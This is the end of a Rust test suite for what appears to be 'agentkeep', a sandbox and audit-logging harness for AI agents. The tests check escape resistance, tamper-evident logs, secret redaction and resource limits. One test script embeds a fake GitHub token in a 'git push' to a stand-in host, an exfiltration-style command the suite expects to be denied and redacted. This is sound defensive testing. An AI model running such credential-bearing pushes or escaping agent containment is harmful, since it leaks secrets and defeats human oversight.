        assert!(!store.ends_with("x\n"), "trust store modified from inside");
    }

    #[test]
    fn l1_audit_log_is_written_and_chain_verifies() {
        let Some(h) = harness("L-A1") else { return };
        let o = h.run("", "git push origin main; echo done");
        assert!(out(&o).contains("done"));
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        let session = fs::read_dir(&sessions)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        let events = agentkeep_audit::verify(&session.join("events.jsonl")).unwrap();
        let kinds: Vec<&str> = events.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds.first(), Some(&"session.start"));
        assert_eq!(kinds.last(), Some(&"session.end"));
        assert!(kinds.contains(&"exec"));
        assert!(kinds.contains(&"approval.request"));
        let start = &events[0].data;
        assert!(start["env_scrubbed_secrets"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v == "FAKE_SECRET_TOKEN"));
        assert!(
            !serde_json::to_string(start)
                .unwrap()
                .contains(FAKE_ENV_SECRET),
            "secret value in log"
        );
    }

    #[test]
    fn l3_secrets_on_command_lines_and_block_values_never_reach_the_log() {
        let Some(h) = harness("L-A3") else { return };
        let token = "ghp_FAKEFAKEFAKEFAKEFAKEFAKEFAKEFAKEFAK1";
        let block = "FAKE-BLOCK-VALUE-agentkeep-l3";
        let policy = format!("[dlp]\nblock_values = [\"{block}\"]\n");
        let script = format!(
            "echo {token} >/dev/null; echo {block} >/dev/null; git push https://x:{token}@example.invalid/r main; echo done"
        );
        let l = h.run_logged(None, &policy, &["sh", "-c", &script], &[]);
        assert!(l.text().contains("done"), "{}", l.text());
        l.assert_log_free_of(&[token, block, "FAKEFAKEFAKE"]);
        assert!(l.raw.contains("[REDACTED:github_token]"), "{}", l.raw);
        assert!(
            l.raw.contains("not logged"),
            "block_values must be summarised:\n{}",
            l.raw
        );
        // The shimmed push was still recorded, just without the credential.
        let execs = l.of("exec");
        assert!(
            execs
                .iter()
                .any(|e| e["argv"][0] == "git" && e["decision"] == "deny"),
            "{}",
            l.raw
        );
    }

    // ---- positive controls --------------------------------------------

    #[test]
    fn positive_control_project_is_writable_and_tools_work() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"");
        let text = out(&o);
        assert!(o.status.success(), "{text}");
        assert_eq!(
            fs::read_to_string(h.project.join("README.md")).unwrap(),
            "changed\n"
        );
        assert!(
            text.contains(&format!(
                "{} escapetester {}",
                h.home.display(),
                h.project.display()
            )),
            "{text}"
        );
    }

    #[test]
    fn positive_control_exit_codes_propagate() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "exit 42");
        assert_eq!(o.status.code(), Some(42), "{}", out(&o));
    }

    #[test]
    fn positive_control_wall_time_limit_kills_the_session() {
        let Some(h) = harness("C4 wall") else { return };
        let o = h.run("[limits]\nwall_time = \"2s\"\n", "sleep 30; echo SURVIVED");
        let text = out(&o);
        assert!(!text.contains("SURVIVED"), "{text}");
        assert_eq!(o.status.code(), Some(124), "{text}");
        let _ = Path::new("/");
    }
}

#[cfg(not(unix))]
#[test]
fn untested_on_this_host() {
    println!(
        "UNTESTED ON THIS HOST: the escape suite runs on Unix only; Windows uses WSL2 (Phase 2)"
    );
    assert!(!require_sandbox());
}
